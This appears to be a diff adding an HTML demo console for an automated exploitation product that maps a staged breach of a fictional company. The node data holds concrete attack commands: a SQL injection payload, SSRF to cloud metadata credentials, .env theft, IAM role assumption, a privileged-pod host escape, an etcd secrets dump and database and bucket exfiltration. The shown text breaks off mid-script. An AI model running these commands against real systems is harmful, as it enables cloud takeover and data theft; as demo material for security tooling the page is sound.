@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OdinForge AEV — Network Breach Map + Asset Proof</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:monospace;font-size:12px;background:#0a0a0f;color:#e2e8f0;min-height:100vh;display:flex;flex-direction:column}
+.root{display:flex;flex-direction:column;flex:1;border:1px solid #1e293b;border-radius:8px;overflow:hidden;background:#0d1117;margin:16px;min-height:0}
+.top{display:flex;align-items:center;gap:10px;padding:7px 14px;border-bottom:1px solid #1e293b;background:#111827;flex-shrink:0}
+.brand{font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#475569}
+.tgt{font-size:10px;color:#60a5fa;flex:1;padding:0 10px;font-family:monospace}
+.sts{display:flex;gap:14px}
+.sv{font-size:9px;color:#475569}.sv-n{font-weight:700;font-family:monospace}
+.chip{display:flex;align-items:center;gap:5px;padding:2px 9px;border-radius:3px;border:1px solid #1e293b;font-size:9px;text-transform:uppercase;letter-spacing:.07em;color:#475569}
+.dot{width:5px;height:5px;border-radius:50%;background:#334155}
+.dot.run{background:#22c55e;animation:bl 1.2s infinite}
+.dot.done{background:#ef4444}
+@keyframes bl{0%,100%{opacity:1}50%{opacity:.2}}
+@keyframes tr{from{opacity:0}to{opacity:1}}
+@keyframes pn{from{opacity:0;transform:scale(0)}to{opacity:1;transform:scale(1)}}
+@keyframes dl{from{stroke-dashoffset:400}to{stroke-dashoffset:0}}
+.body{display:flex;flex:1;min-height:0;overflow:hidden}
+.left{display:flex;flex-direction:column;flex:1;min-width:0;border-right:1px solid #1e293b;overflow:hidden}
+.tf{height:185px;border-bottom:1px solid #1e293b;display:flex;flex-direction:column;flex-shrink:0}
+.th{display:flex;align-items:center;gap:8px;padding:5px 10px;border-bottom:1px solid #1e293b;background:#111827;flex-shrink:0}
+.th-t{font-size:8px;text-transform:uppercase;letter-spacing:.1em;color:#475569}
+.tph{font-size:8px;padding:1px 6px;border-radius:3px;background:rgba(245,158,11,.15);color:#f59e0b;display:none}
+.tb{flex:1;overflow-y:auto;padding:6px 10px;display:flex;flex-direction:column;gap:2px}
+.row{display:flex;gap:6px;font-size:9px;line-height:1.5;animation:tr .15s ease;animation-fill-mode:both}
+.rt{color:#334155;flex-shrink:0;font-size:8px;margin-top:1px;min-width:32px}
+.ra{flex-shrink:0;font-size:7px;padding:1px 4px;border-radius:2px;font-weight:700;margin-top:2px;min-width:36px;text-align:center}
+.ae{background:rgba(239,68,68,.15);color:#ef4444}
+.ar{background:rgba(59,130,246,.15);color:#60a5fa}
+.ac{background:rgba(245,158,11,.15);color:#f59e0b}
+.al{background:rgba(34,197,94,.15);color:#22c55e}
+.as{background:#1e293b;color:#64748b}
+.rm{color:#e2e8f0;flex:1}
+.rm.ok{color:#22c55e}.rm.crit{color:#ef4444}.rm.warn{color:#f59e0b}.rm.dim{color:#475569}
+.cur{display:inline-block;width:6px;height:10px;background:#334155;animation:bc .8s step-end infinite;vertical-align:middle}
+@keyframes bc{0%,100%{opacity:1}50%{opacity:0}}
+.gf{flex:1;display:flex;flex-direction:column;min-height:0;overflow:hidden}
+.gh{display:flex;align-items:center;gap:8px;padding:5px 10px;border-bottom:1px solid #1e293b;background:#111827;flex-shrink:0}
+.gh-t{font-size:8px;text-transform:uppercase;letter-spacing:.1em;color:#475569}
+.gh-hint{font-size:7px;color:#334155;margin-left:auto;transition:color .2s}
+.gb{flex:1;overflow:hidden;position:relative}
+#gs{width:100%;height:100%;display:block}
+.panel{width:270px;flex-shrink:0;display:flex;flex-direction:column;overflow:hidden;transition:width .25s,border .25s}
+.panel.shut{width:0;border-left:none}
+.ph{display:flex;align-items:center;justify-content:space-between;padding:6px 10px;border-bottom:1px solid #1e293b;background:#111827;flex-shrink:0}
+.ph-t{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:#94a3b8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:220px}
+.ph-x{font-size:12px;cursor:pointer;color:#475569;padding:0 3px;line-height:1;flex-shrink:0}
+.ph-x:hover{color:#94a3b8}
+.pb{flex:1;overflow-y:auto;padding:11px 12px;border-left:1px solid #1e293b}
+.pe{display:flex;align-items:center;justify-content:center;height:100%;font-size:10px;color:#334155;text-align:center;padding:20px;line-height:1.7}
+.pf{margin-bottom:12px}
+.pl{font-size:7px;text-transform:uppercase;letter-spacing:.1em;color:#475569;margin-bottom:4px;display:flex;align-items:center;gap:4px}
+.pl-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
+.pv{font-size:10px;color:#e2e8f0;line-height:1.5;word-break:break-all}
+.pv.mono{font-family:monospace;font-size:9px}
+.sev{display:inline-block;font-size:8px;padding:2px 8px;border-radius:3px;font-weight:700;margin-bottom:10px}
+.sc{background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.25)}
+.sh{background:rgba(245,158,11,.15);color:#f59e0b;border:1px solid rgba(245,158,11,.25)}
+.sm{background:rgba(59,130,246,.15);color:#60a5fa;border:1px solid rgba(59,130,246,.25)}
+.si{background:#1e293b;color:#64748b;border:1px solid #334155}
+.pdiv{height:1px;background:#1e293b;margin:10px 0}
+.code{font-size:8.5px;padding:8px;background:#0a0a0f;border-radius:4px;border:1px solid #1e293b;word-break:break-all;line-height:1.65;color:#94a3b8;font-family:monospace;white-space:pre-wrap}
+.asset-grid{display:grid;grid-template-columns:auto 1fr;gap:3px 10px;font-size:9px;line-height:1.7}
+.ag-k{color:#475569;white-space:nowrap}
+.ag-v{color:#e2e8f0;font-family:monospace;word-break:break-all}
+.ag-v.red{color:#ef4444;font-weight:700}
+.ag-v.amber{color:#f59e0b}
+.ag-v.blue{color:#60a5fa}
+.ag-v.green{color:#22c55e}
+.proof-hash{font-size:7.5px;font-family:monospace;color:#334155;margin-top:8px;padding:5px 7px;background:#0a0a0f;border-radius:3px;word-break:break-all;border:1px solid #1e293b}
+.proof-hash span{color:#475569}
+.so{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;z-index:100;background:rgba(10,10,15,.95);transition:opacity .5s}
+.so.gone{opacity:0;pointer-events:none}
+.sol{font-size:9px;text-transform:uppercase;letter-spacing:.12em;color:#475569}
+.sot{font-size:14px;color:#60a5fa;font-family:monospace}
+.go{padding:9px 24px;font-size:10px;font-family:monospace;font-weight:700;letter-spacing:.1em;text-transform:uppercase;border:1px solid #dc2626;border-radius:4px;background:transparent;color:#ef4444;cursor:pointer;transition:background .2s}
+.go:hover{background:rgba(220,38,38,.1)}
+</style>
+</style>
+</head>
+<body>
+<div class="root">
+<div class="top">
+  <span class="brand">OdinForge AEV</span>
+  <span class="tgt" id="tgt">— awaiting target —</span>
+  <div class="sts">
+    <div class="sv"><span class="sv-n" id="sf" style="color:#ef4444">0</span> findings</div>
+    <div class="sv"><span class="sv-n" id="scr" style="color:#f59e0b">0</span> creds</div>
+    <div class="sv"><span class="sv-n" id="snd">0</span> nodes</div>
+    <div class="sv"><span class="sv-n" id="sel">00:00</span></div>
+    <div class="sv"><span class="sv-n" id="sgr" style="color:#334155">—</span> grade</div>
+  </div>
+  <div class="chip"><div class="dot" id="sd"></div><span id="stxt">ready</span></div>
+</div>
+<div class="body">
+  <div class="left">
+    <div class="tf">
+      <div class="th">
+        <span class="th-t">live action feed</span>
+        <span class="tph" id="tph">phase 1</span>
+        <span style="font-size:7px;color:#334155;margin-left:auto" id="aact"></span>
+      </div>
+      <div class="tb" id="tb">
+        <div class="row"><span class="rt"></span><span class="ra as">SYS</span><span class="rm dim">awaiting engagement start...</span></div>
+        <div class="row"><span class="rt"></span><span class="rm dim"><span class="cur"></span></span></div>
+      </div>
+    </div>
+    <div class="gf">
+      <div class="gh">
+        <span class="gh-t">network breach map</span>
+        <span class="gh-hint" id="hint">click any confirmed node to inspect full asset evidence</span>
+      </div>
+      <div class="gb">
+        <svg id="gs" viewBox="0 0 510 295" preserveAspectRatio="xMidYMid meet">
+          <defs>
+            <marker id="ar" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="4" markerHeight="4" orient="auto-start-reverse">
+              <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round"/>
+            </marker>
+          </defs>
+          <text id="idle" x="255" y="148" text-anchor="middle" font-family="monospace" font-size="10" fill="#334155">network map loading...</text>
+        </svg>
+      </div>
+    </div>
+  </div>
+  <div class="panel shut" id="panel">
+    <div class="ph">
+      <span class="ph-t" id="pt">evidence</span>
+      <span class="ph-x" onclick="closeP()">✕</span>
+    </div>
+    <div class="pb" id="pb">
+      <div class="pe">click a node on the<br>network map to inspect<br>its evidence &amp; asset proof</div>
+    </div>
+  </div>
+</div>
+</div>
+<div class="so" id="so">
+  <div class="sol">OdinForge AEV — Operator Console</div>
+  <div class="sot">https://target.acme.corp</div>
+  <div class="sol" style="font-size:8px;margin-top:2px">network breach map · spatial layout · full asset proof · click any node</div>
+  <button class="go" onclick="begin()">begin engagement</button>
+</div>
+<script>
+let e=0,ti=null,fn=0,cr=0,nd=0;
+const ND={};
+
+const NODES=[
+  {id:'p1',x:52,y:38,r:17,label:'1',col:'#ef4444',data:{
+    title:'Phase 1 — application compromise',sev:'critical',
+    assets:[{k:'target host',v:'target.acme.corp',c:'blue'},{k:'resolved IP',v:'44.218.109.23',c:'red'},{k:'CDN / WAF',v:'Cloudflare (AS13335)',c:''},{k:'origin IP',v:'10.0.1.45 (bypass confirmed)',c:'red'},{k:'open ports',v:'80, 443, 8080, 3000',c:''},{k:'tech stack',v:'Node.js 20.11, Express 4.18',c:''},{k:'framework',v:'React 18.2 (SPA)',c:''},{k:'database',v:'PostgreSQL 15.3',c:'red'}],
+    technique:'Active exploitation — multi-vector',mitre:'T1190',evidence:'47 endpoints crawled. 4 vuln classes confirmed. Entry via /api/users/search.',ts:'2026-03-22T09:02:31Z',hash:'a3f8c2d1e4b7f9a2c5d8e1f4a7b2c5d8'}},
+  {id:'sqli',x:138,y:28,r:14,label:'SQLi',col:'#ef4444',data:{
+    title:'SQL injection — /api/users/search',sev:'critical',
+    assets:[{k:'host',v:'target.acme.corp',c:'blue'},{k:'IP address',v:'44.218.109.23',c:'red'},{k:'endpoint',v:'GET /api/users/search',c:''},{k:'parameter',v:'q (query string)',c:'red'},{k:'port',v:'443 (HTTPS)',c:''},{k:'db server',v:'10.0.1.12:5432 (PostgreSQL)',c:'red'},{k:'rows leaked',v:'847 records confirmed',c:'red'},{k:'tables exposed',v:'users, admin_users, api_keys',c:'red'}],
+    technique:"SQL injection (union-based)",mitre:'T1190',status:200,
+    evidence:"Payload: ' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--\nResponse: HTTP 200, 847 rows. users.email, users.password_hash, api_keys.key_value all readable.",
+    curl:"curl -sk -G 'https://target.acme.corp/api/users/search' \\\n  --data-urlencode \"q=' UNION SELECT NULL,table_name,column_name FROM information_schema.columns--\"",
+    ts:'2026-03-22T09:04:58Z',hash:'b7e2d5f8a1c4e7d2f5a8b1c4d7e2f5a8'}},
+  {id:'ssrf',x:138,y:70,r:14,label:'SSRF',col:'#ef4444',data:{
+    title:'SSRF — AWS IMDS endpoint reachable',sev:'critical',
+    assets:[{k:'host',v:'target.acme.corp',c:'blue'},{k:'server IP',v:'44.218.109.23',c:'red'},{k:'endpoint',v:'POST /api/fetch',c:''},{k:'parameter',v:'url (JSON body)',c:'red'},{k:'IMDS IP',v:'169.254.169.254',c:'red'},{k:'IMDS path',v:'/latest/meta-data/iam/security-credentials/',c:'red'},{k:'region',v:'us-east-1',c:''},{k:'instance-id',v:'i-0a1b2c3d4e5f67890',c:''}],
+    technique:'SSRF to cloud metadata service (IMDSv1)',mitre:'T1552.005',status:200,
+    evidence:'HTTP 200 — IAM role credentials returned from 169.254.169.254. IMDSv1 enabled, no token required. Role: ec2-deploy-role.',
+    curl:"curl -sk -X POST 'https://target.acme.corp/api/fetch' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-deploy-role\"}'",
+    ts:'2026-03-22T09:05:52Z',hash:'c1d4e7a2b5f8c1d4e7a2b5f8c1d4e7a2'}},
+  {id:'xss',x:130,y:10,r:10,label:'XSS',col:'#334155',data:{
+    title:'XSS — blocked by WAF (dead end)',sev:'info',
+    assets:[{k:'host',v:'target.acme.corp',c:'blue'},{k:'tested',v:'23 input fields',c:''},{k:'result',v:'Cloudflare WAF — all blocked',c:''}],
+    technique:'Cross-site scripting (attempted, blocked)',mitre:'T1189',evidence:'All XSS payloads blocked by Cloudflare WAF. No reflection points. Skipped.',ts:'2026-03-22T09:06:15Z',hash:null}},
+  {id:'p2',x:205,y:50,r:17,label:'2',col:'#f59e0b',data:{
+    title:'Phase 2 — credential extraction',sev:'critical',
+    assets:[{k:'source 1',v:'https://target.acme.corp/.env (HTTP 200)',c:'red'},{k:'source 2',v:'SSRF → 169.254.169.254 IMDS response',c:'red'},{k:'source 3',v:'SQLi response body — api_keys column',c:'red'},{k:'source 4',v:'Go agent: /home/app/.aws/credentials',c:'red'},{k:'total credentials',v:'6 unique credentials extracted',c:'red'}],
+    technique:'Unsecured credentials — multiple sources',mitre:'T1552',evidence:'6 credentials extracted across 4 sources. AWS admin keys, DB connection string, JWT secret, session tokens.',ts:'2026-03-22T09:07:00Z',hash:'d4e7a2b5c8f1d4e7a2b5c8f1d4e7a2b5'}},
+  {id:'envkey',x:278,y:18,r:13,label:'AWS KEY',col:'#ef4444',data:{
+    title:'AWS_SECRET_ACCESS_KEY — extracted from /.env',sev:'critical',
+    assets:[{k:'source URL',v:'https://target.acme.corp/.env',c:'red'},{k:'server IP',v:'44.218.109.23:443',c:'red'},{k:'HTTP status',v:'200 OK (no auth required)',c:'red'},{k:'key ID',v:'AKIAIOSFODNN7EXAMPLE',c:'red'},{k:'AWS account',v:'123456789012',c:'red'},{k:'region',v:'us-east-1',c:''},{k:'access level',v:'AdministratorAccess',c:'red'}],
+    technique:'Credentials in files — .env exposed over HTTPS',mitre:'T1552.001',status:200,
+    evidence:'/.env served unauthenticated. Contains AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY in plaintext.',
+    curl:"curl -sk 'https://target.acme.corp/.env'",
+    extracted:'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
+    ts:'2026-03-22T09:07:44Z',hash:'e7a2b5c8d1f4e7a2b5c8d1f4e7a2b5c8'}},
+  {id:'dbpass',x:278,y:48,r:13,label:'DB PASS',col:'#f59e0b',data:{
+    title:'DATABASE_URL — PostgreSQL connection string',sev:'critical',
+    assets:[{k:'source URL',v:'https://target.acme.corp/.env',c:'red'},{k:'db hostname',v:'rds.internal.acme.corp',c:'red'},{k:'db IP address',v:'10.0.3.22',c:'red'},{k:'db port',v:'5432 (PostgreSQL 15.3)',c:'red'},{k:'db name',v:'prod',c:'red'},{k:'db user',v:'admin (superuser)',c:'red'},{k:'access level',v:'superuser — all schemas',c:'red'}],
+    technique:'Credentials in files — database URI',mitre:'T1552.001',status:200,
+    extracted:'postgres://admin:S3cr3tP@ss@rds.internal.acme.corp:5432/prod',
+    curl:"curl -sk 'https://target.acme.corp/.env' | grep DATABASE",
+    ts:'2026-03-22T09:07:44Z',hash:'f1a4b7c2d5e8f1a4b7c2d5e8f1a4b7c2'}},
+  {id:'jwtsec',x:278,y:78,r:13,label:'JWT SEC',col:'#f59e0b',data:{
+    title:'JWT_SECRET — signing key extracted',sev:'critical',
+    assets:[{k:'source URL',v:'https://target.acme.corp/.env',c:'red'},{k:'server IP',v:'44.218.109.23:443',c:'red'},{k:'algorithm',v:'HS256 (symmetric — forgeable)',c:'red'},{k:'key length',v:'43 characters',c:'red'},{k:'impact',v:'forge any user auth token',c:'red'}],
+    technique:'Steal application access token via secret key',mitre:'T1528',status:200,
+    extracted:'JWT_SECRET=sup3r_s3cr3t_k3y_f0r_jwt_signing_d0_n0t_sh4r3',
+    curl:"curl -sk 'https://target.acme.corp/.env' | grep JWT",
+    ts:'2026-03-22T09:07:44Z',hash:'a2b5c8d1e4f7a2b5c8d1e4f7a2b5c8d1'}},
+  {id:'imdskey',x:278,y:108,r:13,label:'IMDS ROLE',col:'#ef4444',data:{
+    title:'IAM role credentials via SSRF + IMDS',sev:'critical',
+    assets:[{k:'instance ID',v:'i-0a1b2c3d4e5f67890',c:'red'},{k:'IAM role',v:'ec2-deploy-role',c:'red'},{k:'AWS account',v:'123456789012 (us-east-1)',c:'red'},{k:'key ID',v:'ASIAIOSFODNN7EXAMPLE',c:'red'},{k:'credential type',v:'AssumedRole (temporary)',c:'red'},{k:'token expiry',v:'2026-03-22T15:00:00Z',c:'amber'},{k:'IMDS version',v:'IMDSv1 — no token required',c:'red'}],
+    technique:'Cloud instance metadata API exploitation',mitre:'T1552.005',
+    extracted:'AccessKeyId: ASIAIOSFODNN7EXAMPLE\nSecretAccessKey: [REDACTED — sealed]\nSessionToken: IQoJb3JpZ2luX2VjEA==...',
+    ts:'2026-03-22T09:08:22Z',hash:'b5c8d1e4f7a2b5c8d1e4f7a2b5c8d1e4'}},
+  {id:'p3',x:370,y:30,r:17,label:'3',col:'#3b82f6',data:{
+    title:'Phase 3 — cloud IAM escalation',sev:'critical',
+    assets:[{k:'AWS account',v:'123456789012',c:'red'},{k:'region',v:'us-east-1',c:''},{k:'escalation path',v:'.env AWS_KEY → sts:AssumeRole',c:'red'},{k:'final role ARN',v:'arn:aws:iam::123456789012:role/OrgAdmin',c:'red'},{k:'access policy',v:'AdministratorAccess (*:*)',c:'red'},{k:'services exposed',v:'S3, EC2, RDS, Lambda, IAM, all',c:'red'}],
+    technique:'Cloud IAM privilege escalation via role assumption',mitre:'T1078.004',evidence:'Full AWS AdministratorAccess achieved in 2 API calls from .env key.',ts:'2026-03-22T09:09:05Z',hash:'c8d1e4f7a2b5c8d1e4f7a2b5c8d1e4f7'}},
+  {id:'admin',x:435,y:14,r:14,label:'Admin',col:'#ef4444',data:{
+    title:'AdministratorAccess — AWS cloud root',sev:'critical',
+    assets:[{k:'AWS account',v:'123456789012',c:'red'},{k:'assumed role ARN',v:'arn:aws:sts::123456789012:assumed-role/OrgAdmin/session1',c:'red'},{k:'principal',v:'arn:aws:iam::123456789012:user/deploy-bot',c:'red'},{k:'policy',v:'arn:aws:iam::aws:policy/AdministratorAccess',c:'red'},{k:'STS endpoint',v:'sts.us-east-1.amazonaws.com',c:'blue'},{k:'HTTP response',v:'200 OK',c:'green'},{k:'confirmed via',v:'iam:GetCallerIdentity',c:''}],
+    technique:'Valid cloud accounts — full administrator',mitre:'T1078.004',status:200,
+    curl:"aws sts assume-role \\\n  --role-arn arn:aws:iam::123456789012:role/OrgAdmin \\\n  --role-session-name odinforge-test \\\n  --region us-east-1",
+    extracted:'AssumedRoleId: AROAIOSFODNN7EXAMPLE:odinforge-test\nArn: arn:aws:sts::123456789012:assumed-role/OrgAdmin/odinforge-test',
+    ts:'2026-03-22T09:09:58Z',hash:'d1e4f7a2b5c8d1e4f7a2b5c8d1e4f7a2'}},
+  {id:'s3',x:435,y:50,r:13,label:'S3 open',col:'#ef4444',data:{
+    title:'S3 — acme-customer-data-prod (public-read)',sev:'critical',
+    assets:[{k:'bucket name',v:'acme-customer-data-prod',c:'red'},{k:'bucket ARN',v:'arn:aws:s3:::acme-customer-data-prod',c:'red'},{k:'region',v:'us-east-1',c:''},{k:'S3 endpoint',v:'acme-customer-data-prod.s3.amazonaws.com',c:'blue'},{k:'ACL',v:'public-read (misconfigured)',c:'red'},{k:'object count',v:'847,291 objects',c:'red'},{k:'total size',v:'2.3 TB',c:'red'},{k:'contains',v:'customer PII, payment exports, DB dumps',c:'red'}],
+    technique:'Data from cloud storage — public bucket',mitre:'T1530',
+    curl:"aws s3 ls s3://acme-customer-data-prod --no-sign-request\naws s3 cp s3://acme-customer-data-prod/exports/customers_2026.csv .",
+    extracted:'847,291 objects accessible without credentials. /exports/ contains full customer DB dumps dated 2026.',
+    ts:'2026-03-22T09:10:14Z',hash:'e4f7a2b5c8d1e4f7a2b5c8d1e4f7a2b5'}},
+  {id:'p4',x:200,y:168,r:17,label:'4',col:'#8b5cf6',data:{
+    title:'Phase 4 — Kubernetes breakout',sev:'critical',
+    assets:[{k:'cluster endpoint',v:'https://k8s.internal.acme.corp:6443',c:'red'},{k:'cluster IP',v:'10.0.2.100',c:'red'},{k:'k8s version',v:'v1.28.4',c:'red'},{k:'namespaces',v:'23 (prod, staging, db, auth, payments...)',c:'red'},{k:'total pods',v:'140 running',c:''},{k:'access method',v:'IAM → aws-auth ConfigMap binding',c:'red'}],
+    technique:'Exploit container orchestration — privileged escalation',mitre:'T1610',ts:'2026-03-22T09:11:02Z',hash:'f7a2b5c8d1e4f7a2b5c8d1e4f7a2b5c8'}},
+  {id:'privpod',x:138,y:153,r:14,label:'priv pod',col:'#ef4444',data:{
+    title:'Privileged pod — host filesystem mount',sev:'critical',
+    assets:[{k:'pod name',v:'odinforge-test-7dx8k',c:'red'},{k:'namespace',v:'default',c:''},{k:'node IP',v:'10.0.2.15',c:'red'},{k:'node hostname',v:'ip-10-0-2-15.ec2.internal',c:'red'},{k:'host mount',v:'/ → /host (full filesystem)',c:'red'},{k:'privileged',v:'true (securityContext)',c:'red'},{k:'/etc/shadow',v:'readable — 7 user hashes',c:'red'},{k:'/root/.ssh',v:'authorized_keys found (2 keys)',c:'red'}],
+    technique:'Escape to host via privileged container',mitre:'T1611',
+    curl:"kubectl run pwn --image=alpine --restart=Never \\\n  --overrides='{\"spec\":{\"containers\":[{\"name\":\"c\",\"image\":\"alpine\",\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"h\"}]}],\"volumes\":[{\"name\":\"h\",\"hostPath\":{\"path\":\"/\"}}]}}'",
+    extracted:'Host: ip-10-0-2-15.ec2.internal\n/host/etc/shadow: 7 password hashes confirmed readable\n/host/root/.ssh/authorized_keys: 2 public keys',
+    ts:'2026-03-22T09:11:58Z',hash:'a5b8c1d4e7f2a5b8c1d4e7f2a5b8c1d4'}},
+  {id:'etcd',x:138,y:195,r:13,label:'etcd',col:'#8b5cf6',data:{
+    title:'etcd — cluster secrets unauthenticated',sev:'critical',
+    assets:[{k:'hostname',v:'etcd.internal.acme.corp',c:'blue'},{k:'IP address',v:'10.0.2.5',c:'red'},{k:'port',v:'2379 (client — no TLS, no auth)',c:'red'},{k:'secrets count',v:'23 secrets across namespaces',c:'red'},{k:'critical secret',v:'/registry/secrets/default/db-credentials',c:'red'},{k:'redis secret',v:'/registry/secrets/default/redis-auth',c:'red'}],
+    technique:'Data from configuration repository — etcd',mitre:'T1213',
+    curl:"ETCDCTL_API=3 etcdctl \\\n  --endpoints=http://10.0.2.5:2379 \\\n  get /registry/secrets/default/ --prefix",
+    extracted:'db-credentials: postgres://prod_user:NewProdPass!@rds.internal:5432/prod\nredis-auth: redis://:RedisSecret123@redis.internal:6379',
+    ts:'2026-03-22T09:12:15Z',hash:'b8c1d4e7f2a5b8c1d4e7f2a5b8c1d4e7'}},
+  {id:'p5',x:365,y:168,r:17,label:'5',col:'#06b6d4',data:{
+    title:'Phase 5 — lateral movement',sev:'critical',
+    assets:[{k:'pivot source',v:'10.0.2.15 (K8s node ip-10-0-2-15)',c:'red'},{k:'internal subnets',v:'10.0.3.0/24 (DB tier), 10.0.4.0/24 (app)',c:'red'},{k:'services confirmed',v:'4 of 5 targets accessible',c:'red'},{k:'segmentation',v:'none — flat internal network',c:'red'}],
+    technique:'East-west traversal via harvested credentials',mitre:'T1021',ts:'2026-03-22T09:13:05Z',hash:'c1d4e7f2a5b8c1d4e7f2a5b8c1d4e7f2'}},
+  {id:'postgres',x:432,y:148,r:13,label:'postgres',col:'#06b6d4',data:{
+    title:'PostgreSQL — full database access confirmed',sev:'critical',
+    assets:[{k:'hostname',v:'rds.internal.acme.corp',c:'blue'},{k:'IP address',v:'10.0.3.22',c:'red'},{k:'port',v:'5432 (PostgreSQL 15.3)',c:'red'},{k:'credential source',v:'etcd /registry/secrets/default/db-credentials',c:'red'},{k:'db user',v:'prod_user (superuser)',c:'red'},{k:'database',v:'prod',c:'red'},{k:'tables',v:'12 tables accessible',c:'red'},{k:'payments rows',v:'2,341,887 rows',c:'red'}],
+    technique:'Remote services — database exploitation',mitre:'T1021',
+    curl:"psql postgres://prod_user:NewProdPass!@10.0.3.22:5432/prod \\\n  -c '\\dt' \\\n  -c 'SELECT COUNT(*) FROM payments;'",
+    extracted:'prod.payments: 2,341,887 rows\nprod.users: 847,291 rows\nprod.api_keys: 1,203 rows\n12 tables total.',
+    ts:'2026-03-22T09:13:44Z',hash:'d4e7f2a5b8c1d4e7f2a5b8c1d4e7f2a5'}},
+  {id:'redis',x:432,y:180,r:13,label:'redis',col:'#06b6d4',data:{
+    title:'Redis — session store compromise',sev:'high',
+    assets:[{k:'hostname',v:'redis.internal.acme.corp',c:'blue'},{k:'IP address',v:'10.0.3.45',c:'red'},{k:'port',v:'6379 (Redis 7.2)',c:'red'},{k:'credential source',v:'etcd /registry/secrets/default/redis-auth',c:'red'},{k:'active sessions',v:'23,441 JWT tokens readable',c:'red'},{k:'admin session',v:'uid:1 (admin@acme.corp) found',c:'red'}],
+    technique:'Remote services — in-memory data store',mitre:'T1021',
+    curl:"redis-cli -h 10.0.3.45 -p 6379 -a RedisSecret123 KEYS '*session*'",
+    extracted:'23,441 active sessions. Admin JWT token: eyJhbGciOiJIUzI1NiJ9...',
+    ts:'2026-03-22T09:13:58Z',hash:'e7f2a5b8c1d4e7f2a5b8c1d4e7f2a5b8'}},
+  {id:'intapi',x:432,y:212,r:13,label:'admin API',col:'#ef4444',data:{
+    title:'Internal admin API — no authentication',sev:'critical',
+    assets:[{k:'hostname',v:'admin-api.internal.acme.corp',c:'blue'},{k:'IP address',v:'10.0.4.8',c:'red'},{k:'port',v:'8080 (HTTP — no TLS)',c:'red'},{k:'authentication',v:'none (assumed internal-only)',c:'red'},{k:'endpoints',v:'/admin/users, /admin/config, /admin/export',c:'red'},{k:'data exposed',v:'full user export, system config, secrets',c:'red'}],
+    technique:'Exploit public-facing application (internal network)',mitre:'T1190',status:200,
+    curl:"curl -s http://10.0.4.8:8080/admin/export/users > /tmp/dump.json",
+    extracted:'HTTP 200. /admin/export returns full user table as JSON. No rate limiting. No auth.',
+    ts:'2026-03-22T09:14:12Z',hash:'f2a5b8c1d4e7f2a5b8c1d4e7f2a5b8c1'}},
+  {id:'p6',x:295,y:250,r:17,label:'6',col:'#ef4444',data:{
+    title:'Phase 6 — impact assessment',sev:'critical',
+    assets:[{k:'records exposed',v:'2,341,887 customer records',c:'red'},{k:'PII confirmed',v:'name, email, address, card_last4',c:'red'},{k:'S3 exposure',v:'2.3TB accessible unauthenticated',c:'red'},{k:'subnets reached',v:'10.0.1.0/24, 10.0.2.0/24, 10.0.3.0/24, 10.0.4.0/24',c:'red'},{k:'segmentation',v:'none detected — flat network',c:'red'},{k:'blast radius',v:'ORGANIZATION (full company)',c:'red'},{k:'risk grade',v:'F',c:'red'}],
+    technique:'Data impact — full exfiltration path confirmed',mitre:'T1485',ts:'2026-03-22T09:15:05Z',hash:'a8b1c4d7e2f5a8b1c4d7e2f5a8b1c4d7'}},
+  {id:'rec',x:232,y:264,r:13,label:'2.3M rec.',col:'#ef4444',data:{
+    title:'2,341,887 customer records — full read',sev:'critical',
+    assets:[{k:'db host',v:'rds.internal.acme.corp',c:'blue'},{k:'db IP',v:'10.0.3.22:5432',c:'red'},{k:'table',v:'prod.payments',c:'red'},{k:'row count',v:'2,341,887',c:'red'},{k:'columns',v:'customer_id, email, card_last4, billing_addr',c:'red'},{k:'S3 mirror',v:'s3://acme-customer-data-prod/exports/',c:'red'},{k:'compliance',v:'PCI-DSS, GDPR, CCPA violation',c:'red'}],
+    technique:'Data from information repositories — full exfiltration',mitre:'T1213',
+    extracted:'SELECT * FROM payments LIMIT 5 → confirmed 5/5 rows with full PII\nS3 export confirmed: customers_2026.csv (2.3GB)',
+    ts:'2026-03-22T09:15:22Z',hash:'b1c4d7e2f5a8b1c4d7e2f5a8b1c4d7e2'}},
+  {id:'blast',x:358,y:264,r:13,label:'ORG scope',col:'#ef4444',data:{
+    title:'Blast radius — ORGANIZATION (entire company)',sev:'critical',
+    assets:[{k:'subnets confirmed',v:'10.0.1.0/24, 10.0.2.0/24, 10.0.3.0/24, 10.0.4.0/24',c:'red'},{k:'services reached',v:'PostgreSQL, Redis, K8s, S3, Admin API',c:'red'},{k:'external IP',v:'44.218.109.23 (origin confirmed)',c:'red'},{k:'cloud account',v:'AWS 123456789012 — full admin',c:'red'},{k:'segmentation',v:'none — all tiers reachable',c:'red'},{k:'estimated impact',v:'Full data breach + cloud takeover',c:'red'}],
+    technique:'Impact — organizational scope confirmed',mitre:'T1485',ts:'2026-03-22T09:15:38Z',hash:'c4d7e2f5a8b1c4d7e2f5a8b1c4d7e2f5'}},
+];
+</script>
+<script>
+const EDGES=[
+  {x1:65,y1:38,x2:122,y2:30,col:'#ef4444',d:false,cx:false,delay:4500},
+  {x1:65,y1:45,x2:122,y2:68,col:'#ef4444',d:false,cx:false,delay:5600},
+  {x1:60,y1:32,x2:120,y2:12,col:'#1e293b',d:true,cx:false,delay:6100},
+  {x1:150,y1:38,x2:188,y2:52,col:'#f59e0b',d:false,cx:false,delay:6700},
+  {x1:150,y1:65,x2:188,y2:58,col:'#f59e0b',d:false,cx:true,delay:7000},
